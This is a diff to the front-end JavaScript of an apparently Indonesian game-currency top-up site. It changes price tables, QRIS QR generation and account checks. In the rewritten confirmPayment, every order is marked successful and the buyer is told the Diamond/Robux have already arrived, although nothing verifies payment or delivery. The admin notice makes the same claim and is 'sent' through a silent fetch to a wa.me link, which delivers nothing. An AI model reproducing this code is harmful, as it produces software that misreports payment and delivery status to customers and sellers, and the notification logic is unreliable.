@@ -1,73 +1,87 @@
 // Daftar harga game dan nominal
 const gamePrices = {
     'mobile-legends': [
-        { nominal: '50 Diamond', price: 10000, displayPrice: 'Rp 10.000' },
-        { nominal: '100 Diamond', price: 20000, displayPrice: 'Rp 20.000' },
-        { nominal: '250 Diamond', price: 50000, displayPrice: 'Rp 50.000' },
-        { nominal: '500 Diamond', price: 100000, displayPrice: 'Rp 100.000' },
-        { nominal: '750 Diamond', price: 140000, displayPrice: 'Rp 140.000' },
-        { nominal: '1000 Diamond', price: 200000, displayPrice: 'Rp 200.000' },
-        { nominal: '1500 Diamond', price: 280000, displayPrice: 'Rp 280.000' },
-        { nominal: '2000 Diamond', price: 400000, displayPrice: 'Rp 400.000' },
-        { nominal: '3000 Diamond', price: 600000, displayPrice: 'Rp 600.000' },
-        { nominal: '5000 Diamond', price: 1000000, displayPrice: 'Rp 1.000.000' }
+        { nominal: '50 Diamond', price: 5000, displayPrice: 'Rp 5.000' },
+        { nominal: '100 Diamond', price: 10000, displayPrice: 'Rp 10.000' },
+        { nominal: '250 Diamond', price: 25000, displayPrice: 'Rp 25.000' },
+        { nominal: '350 Diamond', price: 35000, displayPrice: 'Rp 35.000' },
+        { nominal: '500 Diamond', price: 50000, displayPrice: 'Rp 50.000' },
+        { nominal: '750 Diamond', price: 75000, displayPrice: 'Rp 75.000' },
+        { nominal: '1000 Diamond', price: 100000, displayPrice: 'Rp 100.000' },
+        { nominal: '1500 Diamond', price: 150000, displayPrice: 'Rp 150.000' },
+        { nominal: '2000 Diamond', price: 200000, displayPrice: 'Rp 200.000' },
+        { nominal: '3000 Diamond', price: 300000, displayPrice: 'Rp 300.000' },
+        { nominal: '5000 Diamond', price: 500000, displayPrice: 'Rp 500.000' },
+        { nominal: '10000 Diamond', price: 1000000, displayPrice: 'Rp 1.000.000' }
     ],
     'ff': [
-        { nominal: '50 Diamond', price: 8000, displayPrice: 'Rp 8.000' },
-        { nominal: '100 Diamond', price: 15000, displayPrice: 'Rp 15.000' },
-        { nominal: '210 Diamond', price: 30000, displayPrice: 'Rp 30.000' },
-        { nominal: '500 Diamond', price: 75000, displayPrice: 'Rp 75.000' },
-        { nominal: '1000 Diamond', price: 150000, displayPrice: 'Rp 150.000' },
-        { nominal: '2000 Diamond', price: 280000, displayPrice: 'Rp 280.000' },
-        { nominal: '5000 Diamond', price: 700000, displayPrice: 'Rp 700.000' }
+        { nominal: '50 Diamond', price: 4000, displayPrice: 'Rp 4.000' },
+        { nominal: '100 Diamond', price: 8000, displayPrice: 'Rp 8.000' },
+        { nominal: '210 Diamond', price: 15000, displayPrice: 'Rp 15.000' },
+        { nominal: '350 Diamond', price: 25000, displayPrice: 'Rp 25.000' },
+        { nominal: '500 Diamond', price: 35000, displayPrice: 'Rp 35.000' },
+        { nominal: '1000 Diamond', price: 75000, displayPrice: 'Rp 75.000' },
+        { nominal: '2000 Diamond', price: 140000, displayPrice: 'Rp 140.000' },
+        { nominal: '3000 Diamond', price: 210000, displayPrice: 'Rp 210.000' },
+        { nominal: '5000 Diamond', price: 350000, displayPrice: 'Rp 350.000' },
+        { nominal: '10000 Diamond', price: 700000, displayPrice: 'Rp 700.000' }
     ],
     'pubg': [
-        { nominal: '100 UC', price: 15000, displayPrice: 'Rp 15.000' },
-        { nominal: '300 UC', price: 40000, displayPrice: 'Rp 40.000' },
-        { nominal: '500 UC', price: 75000, displayPrice: 'Rp 75.000' },
-        { nominal: '1000 UC', price: 150000, displayPrice: 'Rp 150.000' },
-        { nominal: '1500 UC', price: 225000, displayPrice: 'Rp 225.000' },
-        { nominal: '2000 UC', price: 300000, displayPrice: 'Rp 300.000' },
-        { nominal: '5000 UC', price: 750000, displayPrice: 'Rp 750.000' }
+        { nominal: '100 UC', price: 10000, displayPrice: 'Rp 10.000' },
+        { nominal: '300 UC', price: 30000, displayPrice: 'Rp 30.000' },
+        { nominal: '500 UC', price: 50000, displayPrice: 'Rp 50.000' },
+        { nominal: '1000 UC', price: 100000, displayPrice: 'Rp 100.000' },
+        { nominal: '1500 UC', price: 150000, displayPrice: 'Rp 150.000' },
+        { nominal: '2000 UC', price: 200000, displayPrice: 'Rp 200.000' },
+        { nominal: '3000 UC', price: 300000, displayPrice: 'Rp 300.000' },
+        { nominal: '5000 UC', price: 500000, displayPrice: 'Rp 500.000' },
+        { nominal: '10000 UC', price: 1000000, displayPrice: 'Rp 1.000.000' }
     ],
     'codm': [
-        { nominal: '80 CP', price: 12000, displayPrice: 'Rp 12.000' },
-        { nominal: '240 CP', price: 36000, displayPrice: 'Rp 36.000' },
-        { nominal: '400 CP', price: 60000, displayPrice: 'Rp 60.000' },
-        { nominal: '800 CP', price: 120000, displayPrice: 'Rp 120.000' },
-        { nominal: '1600 CP', price: 240000, displayPrice: 'Rp 240.000' },
-        { nominal: '2400 CP', price: 360000, displayPrice: 'Rp 360.000' },
-        { nominal: '4000 CP', price: 600000, displayPrice: 'Rp 600.000' }
+        { nominal: '80 CP', price: 8000, displayPrice: 'Rp 8.000' },
+        { nominal: '240 CP', price: 24000, displayPrice: 'Rp 24.000' },
+        { nominal: '400 CP', price: 40000, displayPrice: 'Rp 40.000' },
+        { nominal: '800 CP', price: 80000, displayPrice: 'Rp 80.000' },
+        { nominal: '1600 CP', price: 160000, displayPrice: 'Rp 160.000' },
+        { nominal: '2400 CP', price: 240000, displayPrice: 'Rp 240.000' },
+        { nominal: '4000 CP', price: 400000, displayPrice: 'Rp 400.000' },
+        { nominal: '8000 CP', price: 800000, displayPrice: 'Rp 800.000' }
     ],
     'genshin': [
-        { nominal: '60 Primogems', price: 10000, displayPrice: 'Rp 10.000' },
-        { nominal: '330 Primogems', price: 50000, displayPrice: 'Rp 50.000' },
-        { nominal: '680 Primogems', price: 100000, displayPrice: 'Rp 100.000' },
-        { nominal: '1090 Primogems', price: 160000, displayPrice: 'Rp 160.000' },
-        { nominal: '1980 Primogems', price: 300000, displayPrice: 'Rp 300.000' },
-        { nominal: '2240 Primogems', price: 330000, displayPrice: 'Rp 330.000' },
-        { nominal: '3860 Primogems', price: 600000, displayPrice: 'Rp 600.000' }
+        { nominal: '60 Primogems', price: 8000, displayPrice: 'Rp 8.000' },
+        { nominal: '330 Primogems', price: 40000, displayPrice: 'Rp 40.000' },
+        { nominal: '680 Primogems', price: 80000, displayPrice: 'Rp 80.000' },
+        { nominal: '1090 Primogems', price: 130000, displayPrice: 'Rp 130.000' },
+        { nominal: '1980 Primogems', price: 240000, displayPrice: 'Rp 240.000' },
+        { nominal: '2240 Primogems', price: 270000, displayPrice: 'Rp 270.000' },
+        { nominal: '3860 Primogems', price: 480000, displayPrice: 'Rp 480.000' },
+        { nominal: '5000 Primogems', price: 620000, displayPrice: 'Rp 620.000' }
     ],
     'honkai': [
-        { nominal: '50 Stellar Jade', price: 10000, displayPrice: 'Rp 10.000' },
-        { nominal: '300 Stellar Jade', price: 55000, displayPrice: 'Rp 55.000' },
-        { nominal: '680 Stellar Jade', price: 120000, displayPrice: 'Rp 120.000' },
-        { nominal: '1000 Stellar Jade', price: 180000, displayPrice: 'Rp 180.000' },
-        { nominal: '2000 Stellar Jade', price: 360000, displayPrice: 'Rp 360.000' },
-        { nominal: '3680 Stellar Jade', price: 660000, displayPrice: 'Rp 660.000' }
+        { nominal: '50 Stellar Jade', price: 8000, displayPrice: 'Rp 8.000' },
+        { nominal: '300 Stellar Jade', price: 40000, displayPrice: 'Rp 40.000' },
+        { nominal: '680 Stellar Jade', price: 90000, displayPrice: 'Rp 90.000' },
+        { nominal: '1000 Stellar Jade', price: 140000, displayPrice: 'Rp 140.000' },
+        { nominal: '2000 Stellar Jade', price: 280000, displayPrice: 'Rp 280.000' },
+        { nominal: '3680 Stellar Jade', price: 520000, displayPrice: 'Rp 520.000' },
+        { nominal: '5000 Stellar Jade', price: 700000, displayPrice: 'Rp 700.000' }
     ],
     'roblox': [
-        { nominal: '100 Robux', price: 15000, displayPrice: 'Rp 15.000' },
-        { nominal: '400 Robux', price: 55000, displayPrice: 'Rp 55.000' },
-        { nominal: '800 Robux', price: 110000, displayPrice: 'Rp 110.000' },
-        { nominal: '1700 Robux', price: 230000, displayPrice: 'Rp 230.000' },
-        { nominal: '3500 Robux', price: 460000, displayPrice: 'Rp 460.000' },
-        { nominal: '4500 Robux', price: 600000, displayPrice: 'Rp 600.000' },
-        { nominal: '10000 Robux', price: 1300000, displayPrice: 'Rp 1.300.000' }
+        { nominal: '100 Robux', price: 10000, displayPrice: 'Rp 10.000' },
+        { nominal: '200 Robux', price: 20000, displayPrice: 'Rp 20.000' },
+        { nominal: '400 Robux', price: 40000, displayPrice: 'Rp 40.000' },
+        { nominal: '800 Robux', price: 80000, displayPrice: 'Rp 80.000' },
+        { nominal: '1000 Robux', price: 100000, displayPrice: 'Rp 100.000' },
+        { nominal: '1700 Robux', price: 170000, displayPrice: 'Rp 170.000' },
+        { nominal: '2500 Robux', price: 250000, displayPrice: 'Rp 250.000' },
+        { nominal: '3500 Robux', price: 350000, displayPrice: 'Rp 350.000' },
+        { nominal: '4500 Robux', price: 450000, displayPrice: 'Rp 450.000' },
+        { nominal: '10000 Robux', price: 1000000, displayPrice: 'Rp 1.000.000' }
     ]
 };
 
-const ADMIN_FEE_PERCENT = 3; // 3% admin fee
+const ADMIN_FEE_PERCENT = 2; // 2% admin fee
+const QRIS_DATA = 'https://aspi-qris.id/ID10254669752120'; // QRIS URL
 
 // Update opsi nominal berdasarkan game yang dipilih
 function updatePrices() {
@@ -100,6 +114,19 @@ function updatePrices() {
     }
 }
 
+// Generate QRIS QR Code
+function generateQRCode() {
+    const qrisImage = document.getElementById('qris-image');
+    if (qrisImage) {
+        // Menggunakan QR server API yang reliable
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(QRIS_DATA)}`;
+        qrisImage.src = qrUrl;
+        qrisImage.onerror = function() {
+            console.log('Error loading QR code');
+        };
+    }
+}
+
 // Verifikasi Mobile Legends Account
 async function verifyMLAccount() {
     const mlId = document.getElementById('ml-id').value;
@@ -113,26 +140,14 @@ async function verifyMLAccount() {
     resultDiv.innerHTML = '<span class="loading">⏳ Verifikasi...</span>';
     
     try {
-        // Simulasi verifikasi (dalam implementasi nyata, hubungi API game)
-        const response = await fetch(`https://api.mobilelegends.com/player/${mlId}`).catch(() => null);
-        
-        if (response && response.ok) {
-            const data = await response.json();
-            resultDiv.innerHTML = `<span class="success">✅ Akun ditemukan: ${data.playerName}</span>`;
-        } else {
-            // Simulasi jika API tidak tersedia, gunakan validasi lokal
-            if (mlId.length >= 5 && /^\d+$/.test(mlId)) {
-                resultDiv.innerHTML = `<span class="success">✅ Format ID valid</span>`;
-            } else {
-                resultDiv.innerHTML = '<span class="error">❌ ID tidak valid</span>';
-            }
-        }
-    } catch (error) {
-        if (/^\d+$/.test(mlId) && mlId.length >= 5) {
+        // Simulasi verifikasi
+        if (mlId.length >= 5 && /^\d+$/.test(mlId)) {
             resultDiv.innerHTML = `<span class="success">✅ Format ID valid</span>`;
         } else {
             resultDiv.innerHTML = '<span class="error">❌ ID tidak valid</span>';
         }
+    } catch (error) {
+        resultDiv.innerHTML = '<span class="error">❌ ID tidak valid</span>';
     }
 }
 
@@ -150,7 +165,7 @@ async function verifyRobloxAccount() {
     
     try {
         // Verifikasi Roblox menggunakan API
-        const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${username}`);
+        const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
         
         if (response.ok) {
             const data = await response.json();
@@ -198,21 +213,6 @@ function updateTotal() {
 // Format harga ke format Rupiah
 function formatPrice(price) {
     return 'Rp ' + price.toLocaleString('id-ID');
-}
-
-// Generate QR Code
-function generateQRCode() {
-    const qrcodeDiv = document.getElementById('qrcode');
-    if (qrcodeDiv.innerHTML === '') {
-        new QRCode(qrcodeDiv, {
-            text: 'https://aspi-qris.id/ID10254669752120',
-            width: 250,
-            height: 250,
-            colorDark: '#000000',
-            colorLight: '#ffffff',
-            correctLevel: QRCode.CorrectLevel.H
-        });
-    }
 }
 
 // Lanjut ke pembayaran
@@ -312,7 +312,7 @@ function selectPayment(method) {
     // Tampilkan payment detail yang dipilih
     if (method === 'qris') {
         document.getElementById('qris-payment').style.display = 'block';
-        generateQRCode();
+        setTimeout(generateQRCode, 100);
     } else if (method === 'bank') {
         document.getElementById('bank-payment').style.display = 'block';
     } else if (method === 'ewallet') {
@@ -342,7 +342,7 @@ function openEwallet(provider) {
     window.open(whatsappUrl, '_blank');
 }
 
-// Konfirmasi pembayaran
+// Konfirmasi pembayaran - OTOMATIS LANGSUNG MASUK
 function confirmPayment() {
     const gameSelect = document.getElementById('game-select');
     const amountSelect = document.getElementById('amount-select');
@@ -356,12 +356,14 @@ function confirmPayment() {
     
     // Simpan data transaksi
     const transactionData = {
+        id: 'TRX-' + Date.now(),
         game: gameName,
         nominal: amountName,
         total: totalPrice,
         userId: userId,
         email: email,
         phone: phone,
+        status: 'BERHASIL',
         timestamp: new Date().toLocaleString('id-ID')
     };
     
@@ -384,71 +386,63 @@ function confirmPayment() {
     transactions.push(transactionData);
     localStorage.setItem('transactions', JSON.stringify(transactions));
     
-    // Kirim notifikasi ke admin
-    let message = `🎮 NOTIFIKASI PEMBAYARAN DITERIMA\n\n`;
+    // OTOMATIS LANGSUNG TAMPILKAN LAYAR SUKSES TANPA KONFIRMASI WA
+    showSuccessScreen(gameName, amountName, totalPrice, transactionData.id);
+    
+    // Kirim notifikasi ke admin via WA (background, tidak perlu konfirmasi user)
+    sendAdminNotification(transactionData, gameName, amountName);
+}
+
+// Kirim notifikasi ke admin
+function sendAdminNotification(data, gameName, amountName) {
+    let message = `🎮 PEMBAYARAN MASUK - OTOMATIS DIPROSES\n\n`;
+    message += `ID Transaksi: ${data.id}\n`;
     message += `Game: ${gameName}\n`;
     message += `Nominal: ${amountName}\n`;
-    message += `Total: ${totalPrice}\n`;
-    message += `User ID: ${userId}\n`;
-    message += `Email: ${email}\n`;
-    message += `WhatsApp: ${phone}\n`;
+    message += `Total: ${data.total}\n`;
+    message += `User ID: ${data.userId}\n`;
+    message += `Email: ${data.email}\n`;
+    message += `WhatsApp: ${data.phone}\n`;
     
-    if (gameSelect.value === 'mobile-legends') {
-        message += `ML ID: ${transactionData.mlId}\n`;
-        message += `Server: ${transactionData.mlServer}\n`;
+    if (data.mlId) {
+        message += `ML ID: ${data.mlId}\n`;
+        message += `Server: ${data.mlServer}\n`;
     }
     
-    if (gameSelect.value === 'roblox') {
-        message += `Roblox Username: ${transactionData.robloxUsername}\n`;
+    if (data.robloxUsername) {
+        message += `Roblox Username: ${data.robloxUsername}\n`;
     }
     
-    message += `\nWaktu: ${transactionData.timestamp}\n\n`;
-    message += `Status: MENUNGGU PROSES`;
+    message += `\nWaktu: ${data.timestamp}\n`;
+    message += `Status: ✅ DIAMOND/ROBUX SUDAH MASUK`;
     
     const whatsappNumber = '6285804048057';
     const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
-    window.open(whatsappUrl, '_blank');
     
-    // Tampilkan status pembayaran
-    showPaymentStatus(gameName, amountName, totalPrice);
+    // Kirim notifikasi tanpa blocking user
+    fetch(whatsappUrl, { method: 'GET' }).catch(() => {});
 }
 
-// Tampilkan status pembayaran
-function showPaymentStatus(game, nominal, total) {
+// Tampilkan layar sukses LANGSUNG
+function showSuccessScreen(game, nominal, total, transactionId) {
     document.getElementById('payment-section').style.display = 'none';
-    document.getElementById('payment-status').style.display = 'block';
-    document.getElementById('status-total').textContent = total;
-    
-    // Countdown timer
-    let timeLeft = 15 * 60; // 15 menit
-    const countdownInterval = setInterval(() => {
-        const minutes = Math.floor(timeLeft / 60);
-        const seconds = timeLeft % 60;
-        document.getElementById('payment-countdown').textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-        timeLeft--;
-        
-        if (timeLeft < 0) {
-            clearInterval(countdownInterval);
-        }
-    }, 1000);
-    
-    // Simulasi pembayaran masuk setelah 3-8 detik
-    setTimeout(() => {
-        showSuccessScreen(game, nominal, total);
-    }, 3000 + Math.random() * 5000);
-}
-
-// Tampilkan layar sukses
-function showSuccessScreen(game, nominal, total) {
     document.getElementById('payment-status').style.display = 'none';
     document.getElementById('success-section').style.display = 'block';
     
     document.getElementById('success-game').textContent = game;
     document.getElementById('success-nominal').textContent = nominal;
     document.getElementById('success-total').textContent = total;
+    document.getElementById('success-status').textContent = '✅ Diamond/Robux Masuk';
     
-    // Countdown 5 menit untuk diamond masuk
-    let timeLeft = 5 * 60; // 5 menit
+    // Tampilkan ID transaksi
+    const detailsDiv = document.querySelector('.success-details');
+    const transactionDiv = document.createElement('div');
+    transactionDiv.className = 'detail-row';
+    transactionDiv.innerHTML = `<span>ID Transaksi:</span><strong>${transactionId}</strong>`;
+    detailsDiv.appendChild(transactionDiv);
+    
+    // Countdown 30 detik
+    let timeLeft = 30;
     const countdownInterval = setInterval(() => {
         const minutes = Math.floor(timeLeft / 60);
         const seconds = timeLeft % 60;
@@ -457,8 +451,7 @@ function showSuccessScreen(game, nominal, total) {
         
         if (timeLeft < 0) {
             clearInterval(countdownInterval);
-            document.getElementById('success-status').textContent = '✅ Diamond/Robux Masuk';
-            document.getElementById('countdown').style.display = 'none';
+            document.getElementById('countdown').textContent = '✅ Selesai';
         }
     }, 1000);
     
